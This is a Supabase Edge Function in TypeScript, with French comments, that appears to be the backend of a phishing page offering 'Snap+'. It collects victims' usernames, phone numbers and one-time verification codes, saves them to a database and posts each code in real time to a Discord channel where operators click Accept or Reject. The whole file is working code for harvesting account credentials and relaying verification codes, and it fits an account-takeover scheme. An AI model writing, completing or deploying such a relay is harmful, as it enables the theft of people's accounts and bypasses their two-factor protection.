import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const DISCORD_BOT_TOKEN = Deno.env.get('DISCORD_BOT_TOKEN');
    const DISCORD_CHANNEL_ID = Deno.env.get('DISCORD_CHANNEL_ID');
    
    if (!DISCORD_BOT_TOKEN || !DISCORD_CHANNEL_ID) {
      throw new Error('Missing Discord configuration');
    }

    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    const { username, phone, code, step, submissionId } = await req.json();

    // Formater le numéro de téléphone avec espaces (garde le 0)
    const formatPhone = (p: string) => {
      return p.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
    };

    // Si c'est le formulaire initial, créer une entrée
    if (step === "form") {
      const { data, error } = await supabase
        .from('submissions')
        .insert({ username, phone, status: 'pending' })
        .select()
        .single();

      if (error) throw error;

      const embed = {
        title: "📱 Nouvelle demande Snap+",
        description: `👤 **Nom d'utilisateur:** ${username}\n\n📞 **Téléphone:** ${formatPhone(phone)}`,
        color: 0xFFA500, // Orange
        footer: { 
          text: "⏳ En attente du code de vérification..."
        },
      };

      await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
        method: 'POST',
        headers: { 
          'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
          'Content-Type': 'application/json' 
        },
        body: JSON.stringify({ 
          content: "@everyone",
          embeds: [embed] 
        }),
      });

      return new Response(JSON.stringify({ success: true, submissionId: data.id }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // Si c'est le code, mettre à jour et envoyer avec vrais boutons
    if (step === "code" && submissionId) {
      await supabase
        .from('submissions')
        .update({ code, status: 'pending' })
        .eq('id', submissionId);

      const now = new Date();
      const dateStr = now.toLocaleDateString('fr-FR', { 
        day: '2-digit', 
        month: '2-digit', 
        year: 'numeric' 
      });
      const timeStr = now.toLocaleTimeString('fr-FR', { 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit' 
      });

      // Style exactement comme l'image
      const embed = {
        title: "🔐 Code de vérification soumis",
        description: `👤 **Nom d'utilisateur:** ${username}\n\n🔢 **Code saisi:** \`${code}\`\n\n📞 **Téléphone:** ${formatPhone(phone)}\n\n📅 **Soumis à:** ${dateStr} ${timeStr}`,
        color: 0xFFA500, // Orange comme l'image
        footer: { 
          text: "En attente de validation par un modérateur"
        },
      };

      // Message avec @everyone et boutons
      const payload = {
        content: "@everyone",
        embeds: [embed],
        components: [
          {
            type: 1,
            components: [
              {
                type: 2,
                style: 3, // Vert
                label: "Accepter",
                custom_id: `approve_${submissionId}`,
              },
              {
                type: 2,
                style: 4, // Rouge
                label: "Refuser",
                custom_id: `reject_${submissionId}`,
              }
            ]
          }
        ]
      };

      const response = await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
        method: 'POST',
        headers: { 
          'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
          'Content-Type': 'application/json' 
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error('Discord API error:', errorText);
        throw new Error(`Discord API error: ${response.status}`);
      }

      return new Response(JSON.stringify({ success: true }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    return new Response(JSON.stringify({ success: true }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error: unknown) {
    console.error('Error:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ error: errorMessage }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
